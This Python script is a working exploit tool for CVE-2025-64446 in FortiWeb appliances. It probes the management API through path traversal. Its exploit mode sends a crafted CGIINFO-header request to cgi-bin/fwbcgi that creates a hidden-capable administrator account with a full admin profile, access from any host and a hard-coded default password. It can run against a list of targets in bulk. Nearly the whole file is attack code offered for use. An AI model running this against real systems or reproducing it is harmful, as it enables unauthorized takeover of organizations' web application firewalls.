#!/usr/bin/env python3

import requests
import argparse
import json
import urllib3
import base64
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class FortiWebExploit:
    def __init__(self, target, port=443, ssl=True):
        self.target = target
        self.port = port
        self.protocol = "https" if ssl else "http"
        self.base_url = f"{self.protocol}://{target}:{port}"
        self.session = requests.Session()
        self.session.verify = False


    def check_vulnerability(self):
        print("[*] Checking CVE-2025-64446 vulnerability...")

        traversal_patterns = {
            "system_admin": "../../../api/v2.0/system/admin",
            "system_config": ".././../api/v2.0/system/config",
            "cmdb_system": "....//....//....//api/v2.0/cmdb/system",
            "system_status": "../../../api/v2.0/system/status",
            "log_access": "../../../api/v2.0/log/access",
        }

        vulnerable_endpoints = []
        results = {}

        for name, path in traversal_patterns.items():
            try:
                url = urljoin(self.base_url, path)
                print(f"[*] Testing: {name} -> {path}")

                response = self.session.get(url, timeout=10)

                result_data = {
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'headers': dict(response.headers),
                    'url': url,
                    'vulnerable': False
                }

                if response.status_code == 200 and len(response.content) > 0:
                    result_data['vulnerable'] = True
                    vulnerable_endpoints.append(name)
                    print(f"    ✓ VULNERABLE - Status: {response.status_code}, Size: {len(response.content)} bytes")

                    try:
                        json_data = response.json()
                        result_data['json_response'] = json_data
                        print(f"    [*] JSON response detected")
                    except:
                        pass

                elif response.status_code in [401, 403] and len(response.content) > 100:
                    result_data['vulnerable'] = True
                    vulnerable_endpoints.append(name)
                    print(f"    ⚠ POSSIBLY VULNERABLE - Status: {response.status_code}, Size: {len(response.content)} bytes")

                elif response.status_code != 404:
                    print(f"    ? Status: {response.status_code}, Size: {len(response.content)} bytes (investigate further)")
                else:
                    print(f"    ✗ Not vulnerable - Status: {response.status_code}")

                results[name] = result_data

            except requests.exceptions.Timeout:
                print(f"    ✗ Timeout connecting")
                results[name] = {'error': 'Timeout'}
            except requests.exceptions.ConnectionError:
                print(f"    ✗ Connection error")
                results[name] = {'error': 'Connection error'}
            except Exception as e:
                print(f"    ✗ Error: {e}")
                results[name] = {'error': str(e)}

        return results, vulnerable_endpoints


    def print_vulnerability_report(self, results, vulnerable_endpoints):
        print("\n" + "="*60)
        print("[*] VULNERABILITY REPORT")
        print("="*60)

        if vulnerable_endpoints:
            print(f"\n[!] SYSTEM POSSIBLY VULNERABLE")
            print(f"[!] Vulnerable endpoints found: {len(vulnerable_endpoints)}")
            for endpoint in vulnerable_endpoints:
                data = results[endpoint]
                if 'error' not in data:
                    print(f"\n    Endpoint: {endpoint}")
                    print(f"    URL: {data['url']}")
                    print(f"    Status Code: {data['status_code']}")
                    print(f"    Content Length: {data['content_length']} bytes")
                    if 'json_response' in data:
                        print(f"    Type: JSON response detected")
        else:
            print("\n[✓] No vulnerable endpoints found with the tested patterns")
            print("    Note: This does not guarantee the system is secure")

        print("\n[*] Complete details:")
        for endpoint, data in results.items():
            if 'error' not in data:
                status = "VULNERABLE" if data.get('vulnerable') else "NOT VULNERABLE"
                print(f"    {endpoint}: {status} (Status: {data['status_code']})")
            else:
                print(f"    {endpoint}: ERROR - {data['error']}")

        print("\n" + "="*60)


    def check_vulnerability_before_exploit(self):
        """
        Check if the vulnerability is present before attempting exploit.
        Returns True if vulnerable (HTTP 200), False if patched (HTTP 403).
        """
        print("\n" + "="*60)
        print("[*] Pre-exploit vulnerability check")
        print("="*60)

        check_path = "/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi"
        url = urljoin(self.base_url, check_path)

        print(f"[*] Checking: GET {check_path}")
        print(f"[*] Target URL: {url}")

        headers = {
            "Host": self.target,
            "Connection": "keep-alive"
        }

        try:
            response = self.session.get(url, headers=headers, timeout=10)

            print(f"[*] Response Status Code: {response.status_code}")

            if response.status_code == 200:
                print("[✓] HTTP 200 - Vulnerability is present")
                print("[*] Proceeding with exploit...")
                return True
            elif response.status_code == 403:
                print("[✗] HTTP 403 - Vulnerability has been patched")
                print("[*] Exploit will not be executed")
                return False
            else:
                print(f"[?] Unexpected status code: {response.status_code}")
                print("[*] Proceeding with exploit anyway...")
                return True

        except requests.exceptions.Timeout:
            print("[✗] Timeout connecting to target")
            print("[*] Cannot verify vulnerability status")
            return False
        except requests.exceptions.ConnectionError:
            print("[✗] Connection error")
            print("[*] Cannot verify vulnerability status")
            return False
        except Exception as e:
            print(f"[✗] Error: {e}")
            print("[*] Cannot verify vulnerability status")
            return False


    def exploit_cgi_endpoint(self, username="sxy", password="sxyrxyadmin1!",
                             profname="prof_admin", vdom="root", loginname="admin",
                             testpoint_name="Testpoint"):

        print("\n" + "="*60)
        print("[*] EXPLOIT MODE")
        print("="*60)

        exploit_path = "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"
        url = urljoin(self.base_url, exploit_path)

        cgiinfo_data = {
            "username": username,
            "profname": profname,
            "vdom": vdom,
            "loginname": loginname
        }
        cgiinfo_json = json.dumps(cgiinfo_data)
        cgiinfo_b64 = base64.b64encode(cgiinfo_json.encode()).decode()

        payload = {
            "data": {
                "q_type": 1,
                "name": testpoint_name,
                "access-profile": profname,
                "access-profile_val": "0",
                "trusthostv4": "0.0.0.0/0",
                "trusthostv6": "::/0",
                "last-name": "",
                "first-name": "",
                "email-address": "",
                "phone-number": "",
                "mobile-number": "",
                "hidden": 0,
                "comments": "",
                "sz_dashboard": -1,
                "type": "local-user",
                "type_val": "0",
                "admin-usergrp_val": "0",
                "wildcard_val": "0",
                "accprofile-override_val": "0",
                "sshkey": "",
                "passwd-set-time": 0,
                "history-password-pos": 0,
                "history-password0": "",
                "history-password1": "",
                "history-password2": "",
                "history-password3": "",
                "history-password4": "",
                "history-password5": "",
                "history-password6": "",
                "history-password7": "",
                "history-password8": "",
                "history-password9": "",
                "force-password-change": "disable",
                "force-password-change_val": "0",
                "password": password
            }
        }

        headers = {
            "User-Agent": "python-urllib3/2.2.3",
            "Accept-Encoding": "identity",
            "CGIINFO": cgiinfo_b64,
            "Content-Type": "application/json"
        }

        print(f"\n[*] Target URL: {url}")
        print(f"[*] Username: {username}")
        print(f"[*] Password: {password}")
        print(f"[*] Profile: {profname}")
        print(f"[*] VDOM: {vdom}")
        print(f"[*] Testpoint name: {testpoint_name}")
        print(f"\n[*] CGIINFO header: {cgiinfo_b64}")
        print(f"[*] Sending POST request...")

        try:
            response = self.session.post(
                url,
                headers=headers,
                json=payload,
                timeout=10
            )

            print(f"\n[*] Response Status Code: {response.status_code}")
            print(f"[*] Response Headers:")
            for key, value in response.headers.items():
                print(f"    {key}: {value}")

            print(f"\n[*] Response Content Length: {len(response.content)} bytes")
            print(f"[*] Response Body:")
            print("-" * 60)

            try:
                json_response = response.json()
                print(json.dumps(json_response, indent=2))
            except:
                try:
                    print(response.text)
                except:
                    print(response.content[:1000])

            print("-" * 60)

            if response.status_code == 200:
                print("\n[!] SUCCESS - Request completed with status 200")
                print("[!] The exploit may have succeeded - check the response above")
            elif response.status_code in [401, 403]:
                print("\n[⚠] Authentication/Authorization error - exploit may have been blocked")
            elif response.status_code == 404:
                print("\n[✗] Endpoint not found - system may not be vulnerable or path is incorrect")
            else:
                print(f"\n[?] Unexpected status code: {response.status_code}")

            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content': response.content,
                'text': response.text if hasattr(response, 'text') else None,
                'url': url
            }

        except requests.exceptions.Timeout:
            print("\n[✗] Timeout connecting to target")
            return {'error': 'Timeout'}
        except requests.exceptions.ConnectionError:
            print("\n[✗] Connection error")
            return {'error': 'Connection error'}
        except Exception as e:
            print(f"\n[✗] Error: {e}")
            return {'error': str(e)}


def main():
    parser = argparse.ArgumentParser(
        description='Exploit tool for CVE-2025-64446 vulnerability verification'
    )
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-l', '--targets-file', help='File containing target IP addresses (one per line)')
    parser.add_argument('-p', '--port', default=443, type=int, help='Target port (default: 443)')
    parser.add_argument('--http', action='store_true', help='Use HTTP instead of HTTPS')
    parser.add_argument('--check', action='store_true', help='Vulnerability verification only')
    parser.add_argument('--exploit', action='store_true', help='Execute CGI endpoint exploit (WARNING: modifies system)')
    parser.add_argument('--username', default='sxy', help='Username for exploit (default: sxy)')
    parser.add_argument('--password', default='sxyrxyadmin1!', help='Password to set (default: sxyrxyadmin1!)')
    parser.add_argument('--profname', default='prof_admin', help='Profile name (default: prof_admin)')
    parser.add_argument('--vdom', default='root', help='VDOM name (default: root)')
    parser.add_argument('--loginname', default='admin', help='Login name (default: admin)')
    parser.add_argument('--testpoint-name', default='Testpoint', help='Testpoint/user name to create (default: Testpoint)')

    args = parser.parse_args()

    # Validate that either target or targets-file is provided
    if not args.target and not args.targets_file:
        parser.error("Either --target (-t) or --targets-file (-l) must be provided")

    # Collect targets
    targets = []
    if args.target:
        targets.append(args.target)

    if args.targets_file:
        try:
            with open(args.targets_file, 'r') as f:
                for line in f:
                    target = line.strip()
                    if target:
                        targets.append(target)
        except FileNotFoundError:
            print(f"[✗] Error: File '{args.targets_file}' not found")
            return
        except Exception as e:
            print(f"[✗] Error reading targets file: {e}")
            return

    if not targets:
        print("[✗] Error: No valid targets found")
        return

    print(f"[*] Processing {len(targets)} target(s)...\n")

    # Process each target
    for idx, target in enumerate(targets, 1):
        print("\n" + "="*60)
        print(f"[*] Target {idx}/{len(targets)}: {target}")
        print("="*60)

        exploit = FortiWebExploit(target, args.port, not args.http)

        if args.exploit:
            # Check vulnerability before attempting exploit
            is_vulnerable = exploit.check_vulnerability_before_exploit()

            if not is_vulnerable:
                print("\n[✗] Exploit aborted - vulnerability check failed")
                continue

            result = exploit.exploit_cgi_endpoint(
                username=args.username,
                password=args.password,
                profname=args.profname,
                vdom=args.vdom,
                loginname=args.loginname,
                testpoint_name=args.testpoint_name
            )

            if 'error' not in result:
                print("\n[*] Exploit attempt completed")
            else:
                print(f"\n[*] Exploit failed: {result.get('error')}")

        elif args.check:
            print("[*] Verification mode activated - Information gathering only")
            results, vulnerable = exploit.check_vulnerability()
            exploit.print_vulnerability_report(results, vulnerable)
        else:
            print("[*] Executing vulnerability verification...")
            results, vulnerable = exploit.check_vulnerability()
            exploit.print_vulnerability_report(results, vulnerable)

        # Add separator between targets (except for the last one)
        if idx < len(targets):
            print("\n")


if __name__ == "__main__":
    main()

